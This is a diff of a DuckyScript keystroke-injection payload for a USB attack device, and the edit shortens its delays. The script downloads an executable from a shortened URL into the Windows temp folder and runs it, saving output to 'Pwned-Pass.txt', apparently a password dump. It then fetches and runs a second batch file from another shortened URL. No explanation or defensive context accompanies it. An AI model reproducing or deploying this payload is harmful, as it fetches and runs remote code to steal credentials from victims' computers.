@@ -9,18 +9,18 @@ ENTER
 DELAY 1000
 STRING cd $env:TEMP
 ENTER
-DELAY 1000
+DELAY 100
 STRING Invoke-WebRequest 'https://tinyurl.com/5ybbuyfu' -OutFile m.exe
 ENTER
-DELAY 15000
+DELAY 100
 STRING .\m.exe > Pwned-Pass.txt
 ENTER
-DELAY 1000
+DELAY 100
 STRING Invoke-WebRequest 'https://tinyurl.com/mr2eddpt' -OutFile d.bat
 ENTER
-DELAY 1000
+DELAY 100
 STRING .\d.bat
 ENTER
-DELAY 3000
+DELAY 100
 STRING exit
 ENTER
